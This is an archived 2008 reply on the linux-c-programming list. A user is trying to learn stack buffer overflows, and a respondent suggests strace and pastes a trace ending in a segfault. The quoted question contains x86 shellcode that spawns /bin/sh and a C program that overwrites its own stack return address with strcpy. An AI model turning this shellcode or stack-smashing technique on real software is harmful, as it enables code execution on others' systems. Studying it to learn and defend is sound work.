From: Patrik =?ISO-8859-1?Q?B=E5t=2C?= RTL <rtl@codehack.se>
Subject: Re: buffer overflow
Date: Tue, 11 Mar 2008 09:33:11 +0100
Message-ID: <1205224391.4033.7.camel@debian.nordiclan.net>
References: <47D621E6.1090403@linux.vnet.ibm.com>
Mime-Version: 1.0
Content-Transfer-Encoding: QUOTED-PRINTABLE
Return-path: <linux-c-programming-owner@vger.kernel.org>
In-Reply-To: <47D621E6.1090403@linux.vnet.ibm.com>
Sender: linux-c-programming-owner@vger.kernel.org
List-ID: <linux-c-programming.vger.kernel.org>
Content-Type: text/plain; charset="iso-8859-1"
To: Varun Chandramohan <varunc@linux.vnet.ibm.com>
Cc: linux-c-programming@vger.kernel.org

Hello, there was a long time since I coded some C, but maybe here is
some help:

strace ./test <-- use STRACE to see some more detail...=20


Here is proboby your error...
----- CODE -----
  for (i =3D 0; i < 32; i++)
    *(long_ptr + i) =3D  (long)&buffer;
----- /CODE -----


----- strace -----
execve("./test", ["./test"], [/* 36 vars */]) =3D 0
brk(0)                                  =3D 0x804a000
access("/etc/ld.so.nohwcap", F_OK)      =3D -1 ENOENT (No such file or
directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1,
0) =3D 0xb7f4c000
access("/etc/ld.so.preload", R_OK)      =3D -1 ENOENT (No such file or
directory)
open("/etc/ld.so.cache", O_RDONLY)      =3D 3
fstat64(3, {st_mode=3DS_IFREG|0644, st_size=3D59381, ...}) =3D 0
mmap2(NULL, 59381, PROT_READ, MAP_PRIVATE, 3, 0) =3D 0xb7f3d000
close(3)                                =3D 0
access("/etc/ld.so.nohwcap", F_OK)      =3D -1 ENOENT (No such file or
directory)
open("/lib/i686/cmov/libc.so.6", O_RDONLY) =3D 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300e\1"...,
512) =3D 512
fstat64(3, {st_mode=3DS_IFREG|0755, st_size=3D1413540, ...}) =3D 0
mmap2(NULL, 1418864, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3,
0) =3D 0xb7de2000
mmap2(0xb7f37000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|
MAP_DENYWRITE, 3, 0x155) =3D 0xb7f37000
mmap2(0xb7f3a000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|
MAP_ANONYMOUS, -1, 0) =3D 0xb7f3a000
close(3)                                =3D 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1,
0) =3D 0xb7de1000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7de16b0,
limit:1048575, seg_32bit:1, contents:0, read_exec_only:0,
limit_in_pages:1, seg_not_present:0, useable:1}) =3D 0
mprotect(0xb7f37000, 4096, PROT_READ)   =3D 0
munmap(0xb7f3d000, 59381)               =3D 0
--- SIGSEGV (Segmentation fault) @ 0 (0) ---
+++ killed by SIGSEGV +++
Process 28060 detached

------ /strace ------


Kind regards Patrik B=C3=A5t

tis 2008-03-11 klockan 11:38 +0530 skrev Varun Chandramohan:
> Hi all,
>=20
>              Can someone tell me whats is wrong with this program? Al=
l i
> get is seg fault. Iam trying to create a stack overflow and exec a
> shell. Somehow its not working. The system is x86 on linux.
> gcc (GCC) 4.1.1 20070105 (Red Hat 4.1.1-52)
> Copyright (C) 2006 Free Software Foundation, Inc.
> This is free software; see the source for copying conditions.  There =
is NO
> warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PU=
RPOSE.
>=20
>=20
>=20
> The Code:
> #include <stdio.h>
> #include <string.h>
>=20
> char shellcode[] =3D
>         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0=
\x0b"
>         "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40=
\xcd"
>         "\x80\xe8\xdc\xff\xff\xff/bin/sh";
> #if 0
> char shellcode[] =3D
>         "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00=
\x00"
>         "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd=
\x80"
>         "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff=
\xff"
>         "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
>=20
> #endif
>=20
> char large_string[128];
> int main() {
>   char buffer[96];
>   int i;
>   long *long_ptr =3D (long *) large_string;
>   memset(&buffer,0,sizeof(buffer));
>=20
>   for (i =3D 0; i < 32; i++)
>     *(long_ptr + i) =3D  (long)&buffer;
>=20
>   for (i =3D 0; i < strlen(shellcode); i++)
>     large_string[i] =3D shellcode[i];
>=20
>   strcpy(buffer,large_string);
> }
>=20
> --
> To unsubscribe from this list: send the line "unsubscribe linux-c-pro=
gramming" in
> the body of a message to majordomo@vger.kernel.org
> More majordomo info at  http://vger.kernel.org/majordomo-info.html

--
To unsubscribe from this list: send the line "unsubscribe linux-c-progr=
amming" in
the body of a message to majordomo@vger.kernel.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
